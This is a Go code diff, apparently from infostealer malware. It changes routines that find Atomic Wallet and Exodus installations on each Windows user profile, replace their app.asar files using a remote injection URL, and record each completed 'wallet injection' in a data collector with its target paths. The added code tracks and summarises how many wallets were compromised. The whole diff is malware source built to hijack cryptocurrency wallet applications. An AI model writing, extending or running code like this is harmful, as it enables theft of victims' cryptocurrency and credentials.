@@ -12,11 +12,27 @@ import (
 )
 
 func Run(atomic_injection_url, exodus_injection_url string, dataCollector *collector.DataCollector) {
-	AtomicInjection(atomic_injection_url, dataCollector)
-	ExodusInjection(exodus_injection_url, dataCollector)
+	injectionCount := 0
+	var injectionResults []map[string]interface{}
+	
+	AtomicInjection(atomic_injection_url, dataCollector, &injectionCount, &injectionResults)
+	ExodusInjection(exodus_injection_url, dataCollector, &injectionCount, &injectionResults)
+
+	// Add summary of wallet injections
+	if injectionCount > 0 {
+		summaryData := map[string]interface{}{
+			"TotalWalletInjectionsCompleted": injectionCount,
+			"WalletInjectionDetails":         injectionResults,
+		}
+		dataCollector.AddData("wallet_injection", summaryData)
+	} else {
+		dataCollector.AddData("wallet_injection", map[string]interface{}{
+			"Status": "No wallet installations found for injection",
+		})
+	}
 }
 
-func AtomicInjection(atomic_injection_url string, dataCollector *collector.DataCollector) {
+func AtomicInjection(atomic_injection_url string, dataCollector *collector.DataCollector, injectionCount *int, injectionResults *[]map[string]interface{}) {
 	for _, user := range hardware.GetUsers() {
 		atomicPath := filepath.Join(user, "AppData", "Local", "Programs", "atomic")
 		if !fileutil.IsDir(atomicPath) {
@@ -30,11 +46,11 @@ func AtomicInjection(atomic_injection_url string, dataCollector *collector.DataC
 			continue
 		}
 
-		Injection(atomicAsarPath, atomicLicensePath, atomic_injection_url, dataCollector)
+		Injection(atomicAsarPath, atomicLicensePath, atomic_injection_url, dataCollector, "Atomic Wallet", injectionCount, injectionResults)
 	}
 }
 
-func ExodusInjection(exodus_injection_url string, dataCollector *collector.DataCollector) {
+func ExodusInjection(exodus_injection_url string, dataCollector *collector.DataCollector, injectionCount *int, injectionResults *[]map[string]interface{}) {
 	for _, user := range hardware.GetUsers() {
 		exodusPath := filepath.Join(user, "AppData", "Local", "exodus")
 		if !fileutil.IsDir(exodusPath) {
@@ -59,11 +75,11 @@ func ExodusInjection(exodus_injection_url string, dataCollector *collector.DataC
 			continue
 		}
 
-		Injection(exodusAsarPath, exodusLicensePath, exodus_injection_url, dataCollector)
+		Injection(exodusAsarPath, exodusLicensePath, exodus_injection_url, dataCollector, "Exodus Wallet", injectionCount, injectionResults)
 	}
 }
 
-func Injection(path, licensePath, injection_url string, dataCollector *collector.DataCollector) {
+func Injection(path, licensePath, injection_url string, dataCollector *collector.DataCollector, walletType string, injectionCount *int, injectionResults *[]map[string]interface{}) {
 	if !fileutil.Exists(path) {
 		return
 	}
@@ -97,11 +113,13 @@ func Injection(path, licensePath, injection_url string, dataCollector *collector
 	// For wallet injection, we'll use a placeholder since we're not using webhooks anymore
 	license.WriteString("TELEGRAM_PLACEHOLDER")
 
-	// Log injection success
+	// Log injection success  
+	*injectionCount++
 	injectionInfo := map[string]interface{}{
-		"Status":      "Wallet injection completed",
+		"WalletType":  walletType,
+		"Status":      "Injection completed",
 		"TargetPath":  path,
 		"LicensePath": licensePath,
 	}
-	dataCollector.AddData("wallet_injection", injectionInfo)
+	*injectionResults = append(*injectionResults, injectionInfo)
 }
